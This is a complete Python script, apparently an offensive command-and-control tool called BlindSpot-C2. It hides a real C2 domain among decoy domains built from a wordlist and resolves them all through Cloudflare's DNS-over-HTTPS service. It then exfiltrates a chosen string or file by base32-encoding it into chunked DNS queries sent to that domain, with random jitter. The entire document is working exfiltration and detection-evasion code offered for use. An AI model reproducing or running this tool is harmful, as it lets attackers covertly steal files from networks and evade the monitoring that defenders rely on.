#!/usr/bin/env python3
"""
Usage:
    python BlindSpot-C2.py -w words.txt -c 20 -d example.com --data "Hello, C2!"
"""

import argparse
import base64
import random
import sys
import time
import requests

DOH_URL = "https://cloudflare-dns.com/dns-query"
HEADERS = {"accept": "application/dns-json"}
TLDS = [".com", ".net", ".org", ".info", ".biz", ".co", ".io"]



# DGA 
def load_wordlist(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            words = [line.strip().lower() for line in f if line.strip()]
        if len(words) < 2:
            raise ValueError("Wordlist must contain at least 2 words.")
        return words
    except FileNotFoundError:
        print(f"Error: Wordlist file not found: {path}", file=sys.stderr)
        sys.exit(1)


def generate_domain(words):
    word1 = random.choice(words)
    word2 = random.choice(words)
    tld = random.choice(TLDS)
    clean = lambda w: "".join(c for c in w if c.isalnum())
    w1, w2 = clean(word1), clean(word2)
    suffix = str(random.randint(1, 999)) if random.random() < 0.3 else ""
    return f"{w1}{w2}{suffix}{tld}"


def generate_dga_list(words, count):
    return [generate_domain(words) for _ in range(count)]

def blend_real_domain(fake_domains, real_domain):
    blended = fake_domains.copy()
    position = random.randint(0, len(blended))
    blended.insert(position, real_domain)
    return blended, position


def extract_domain(url):
    """
    Domain = before first /
    Path = after first / 
    """
    s = url.strip()
    if s.startswith("http://"):
        s = s[7:]
    elif s.startswith("https://"):
        s = s[8:]

    if "/" in s:
        domain, path = s.split("/", 1)
        return domain, "/" + path
    return s, ""



# DoH 
def resolve_doh(domain, qtype= "A"):
    params = {"name": domain, "type": qtype}
    try:
        r = requests.get(DOH_URL, params=params, headers=HEADERS, timeout=5)
        r.raise_for_status()
        data = r.json()
        return [a["data"] for a in data.get("Answer", [])]
    except Exception:
        return []


def resolve_with_doh(domain, qtype= "A"):
    answers = resolve_doh(domain, qtype)
    return {
        "domain": domain,
        "resolved": len(answers) > 0,
        "answers": answers,
        "status": "NOERROR" if answers else "NXDOMAIN"
    }



def tunnel_doh(data, domain, path, qtype= "A"):
    full_payload = path.encode() + b"" + data
    encoded = base64.b32encode(full_payload).decode().rstrip("=")
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    responses = []

    print(f"[TUNNEL] Payload: {len(data)} bytes -> {len(chunks)} DoH queries")

    for seq, chunk in enumerate(chunks):
        query_domain = f"{seq}.{chunk}.{domain}"
        print(f"[Request {seq:2d}] {len(chunk)} chars -> {query_domain[:63]}")
        answers = resolve_doh(query_domain, qtype)
        responses.append(answers)
        time.sleep(random.uniform(0.1, 0.5))

    return responses


def get_payload(args):
    if args.file:
        try:
            with open(args.file, "rb") as f:
                return f.read()
        except FileNotFoundError:
            print(f"Error: File not found: {args.file}", file=sys.stderr)
            sys.exit(1)
    elif args.data:
        return args.data.encode()
    return None



def main():
    parser = argparse.ArgumentParser(
        description="DGA + DoH: Discover C2 via DGA, send data via DoH tunneling"
    )
    parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")
    parser.add_argument("-c", "--count", type=int, default=20, help="Number of fake domains")
    parser.add_argument("-d", "--domain", required=True, help="Domain or URL")
    parser.add_argument("--path", default="", help="Path appended to domain for tunneling")
    parser.add_argument("--jitter", action="store_true", help="Random delay between DoH queries")
    parser.add_argument("--qtype", default="A", choices=["A", "AAAA", "TXT", "CNAME"])

    # Data options
    parser.add_argument("--data", help="String data to tunnel via DoH")
    parser.add_argument("--file", help="File to tunnel via DoH (overrides --data)")

    args = parser.parse_args()


    domain, extracted_path = extract_domain(args.domain)
    path = args.path or extracted_path or "/"

    print(f"Domain: {domain}")
    print(f"Path:   {path}")

    words = load_wordlist(args.wordlist)

   
    print(f"[DGA] Generating {args.count} fake domains...")
    fake_domains = generate_dga_list(words, args.count)
    blended, real_pos = blend_real_domain(fake_domains, domain)

    print(f"[DGA] Real domain '{domain}' hidden at position {real_pos}")
    print(f"[DGA] Total DoH queries: {len(blended)}")
    print("-" * 60)

    # DGA 
    print(f"[DoH] Resolving via {DOH_URL}...")
    print()

    found_c2 = None
    for i, d in enumerate(blended):
        marker = "[REAL]" if i == real_pos else ""
        result = resolve_with_doh(d, args.qtype)
        status_icon = "✓" if result["resolved"] else "✗"
        print(f"  [{i:2d}] {status_icon} {d:<40} {result['status']}{marker}")

        if result["resolved"] and i == real_pos:
            found_c2 = result
            print(f"       -> C2 IP: {', '.join(result['answers'])}")

        if args.jitter:
            time.sleep(random.uniform(0.5, 3.0))


    print()
    print("=" * 60)
    print("DGA DISCOVERY SUMMARY")
    print("=" * 60)
    print(f"Fake domains: {args.count}")
    print(f"Real domain:  {domain} (position {real_pos})")
    print(f"DoH queries:  {len(blended)}")
    print(f"C2 found:     {found_c2 is not None}")
    if found_c2:
        print(f"C2 IP:        {', '.join(found_c2['answers'])}")

    # DoH Tunneling
    payload = get_payload(args)
    if payload and found_c2:
        print()
        print("=" * 60)
        print("DoH DATA TUNNELING")
        print("=" * 60)
        responses = tunnel_doh(payload, domain, path, args.qtype)
        print(f"[TUNNEL] Completed: {len(responses)} DoH queries sent")
    elif payload and not found_c2:
        print()
        print("[TUNNEL] C2 not found. No data sent.")



if __name__ == "__main__":
    main()
